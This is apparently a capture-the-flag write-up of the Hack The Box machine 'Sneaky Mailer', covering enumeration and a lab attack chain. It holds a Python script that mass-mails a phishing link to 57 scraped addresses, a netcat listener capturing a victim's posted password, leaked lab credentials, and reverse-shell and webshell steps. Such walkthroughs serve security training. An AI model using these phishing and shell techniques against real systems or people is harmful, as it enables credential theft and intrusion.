# Sneaky Mailer

![Image](https://www.hackthebox.eu/storage/avatars/5f5ab2f3fb31673d80623bdd98b286c3.png)

- OS: _Linux_
- Difficulty: _Medium_
- Creator: [_sulcud_](https://www.hackthebox.eu/home/users/profile/106709)
- User blood: [_InfoSecJack_](https://www.hackthebox.eu/home/users/profile/52045)
- Root blood: [_InfoSecJack_](https://www.hackthebox.eu/home/users/profile/52045)


Sneaky Mailer was a linux medium rated box that in the first step involved some phishing to get credentials to port `993/imap`, we accessed that port with `evolution` and logged in with the credentials we had, and in the sent emails tab we could see another set of credentials which we could use to login to ftp. In ftp we had write access to that directory so we could just upload a php reverse shell and get a shell as www-data. From there we could see a directory with the name of pypi.sneakycorp.htb which was located inside `/var/www` and inside it there was a file called `.htpasswd` which had username and md5 apr hashed password which we cracked with rockyou.txt. From there we went to `http://pypi.sneakymailer.htb:8080/` and we can see there that we can install modules remotely using pip, so we created our own package with an intent to write our public ssh key into authorized_keys for user `low`. After ssh-ing into the user we run `sudo -l` and see that we can run pip3 as root, so we go to [GTFObins](https://gtfobins.github.io/) and search for pip. We see that there is `Shell` and we copy paste the lines into the ssh session and just like that we get root.

## Nmap

Running our nmap scan with the command of `nmap -sC -sV -v -oA nmap/sneakymailer 10.10.10.197` we can see the following output:
```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 OK ACL2=UNION UIDPLUS STARTTLS completed CAPABILITY SORT ENABLE IDLE UTF8=ACCEPTA0001 NAMESPACE QUOTA THREAD=REFERENCES CHILDREN ACL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 OK ACL2=UNION UIDPLUS completed CAPABILITY UTF8=ACCEPTA0001 SORT ENABLE IDLE THREAD=REFERENCES NAMESPACE QUOTA ACL CHILDREN AUTH=PLAIN
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web enumeration

There are a number of ports open so we continue our enumeration, we open `http://10.10.10.197` and we can see we get redirected to `http://sneakycorp.htb`, so we need to add `sneakycorp.htb` to our `/etc/hosts` file. To do that we need this format:
```
<IP>	<vhost>
```
Which in our case should look like:
```
10.10.10.197	sneakycorp.htb
```
And we add that line inside the /etc/hosts like so:
```
127.0.0.1       localhost
127.0.1.1       parrot
10.10.10.197    sneakycorp.htb

\# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Then we proceed to the website. On /team.php we can see 57 emails from the users, so I grabbed each one and put them all inside emails.txt file.

## Phishing

From here we can try to phish some of the users using smtp. To do it manually we can use telnet to connect to port 25 with the command:
```
telnet 10.10.10.197 25
```
First we setup a listener on port 80:
```
sudo nc -nvlp 80
```
Then we can run the following commands for telnet:
```
MAIL FROM: ryaagard@sneakycorp.htb
RCPT TO: <{email of one of the users from the site}>
DATA
http://<Our tun0 IP>/
.
```
And we can see it says OK and that it is queued. But to not really guess the emails we can write a simple python script to send the email to each of the 57 users.
```
#!/usr/bin/env python3

from socket import *
import sys

mailserver = ("10.10.10.197", 25)
client = socket(AF_INET, SOCK_STREAM)
client.connect(mailserver)

def main():
	global i
	with open('emails.txt', 'r') as f:
		for email in f.readlines():
			email = email.strip()
			print(f"[~] Current email: {email}", end="\r")
			client.send('MAIL FROM: angelicaramos@sneakymailer.htb\r\n'.encode())
			client.send(f'RCPT TO: <{email}>\r\n'.encode())
			client.send('DATA\r\n'.encode())
			client.send('http://10.10.15.227/\r\n'.encode())
			client.send('.\r\n'.encode())
			response = client.recv(1024)

try:
	main()
except KeyboardInterrupt:
	sys.exit()
```
Then we run python3 send.py and after running it we can see in our nc listener that some user connected back with his password and email
```
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:54502.
POST /%0D HTTP/1.1
Host: 10.10.15.227
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```
It is obviously url encoded so when we decode it we get the password ^(#J@SkFv2\[%KhIxKk(Ju\`hqcHl<:Ht and the email paulbyrd@sneakymailer.htb, with that we can login to port 993 using `evolution` and we can see in sent emails another set of credentials for user `developer` and the password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`. We try to login to ftp using those credentials and we get in. There is a directory called `dev` and we cd into it, we can see inside that it is the directory of the web-app on `dev.sneakycorp.htb` which we could find with `gobuster`. So we try to put a webshell in there and it works, we can access it from `http://dev.sneakycorp.htb/<filename>` and we get a shell as www-data!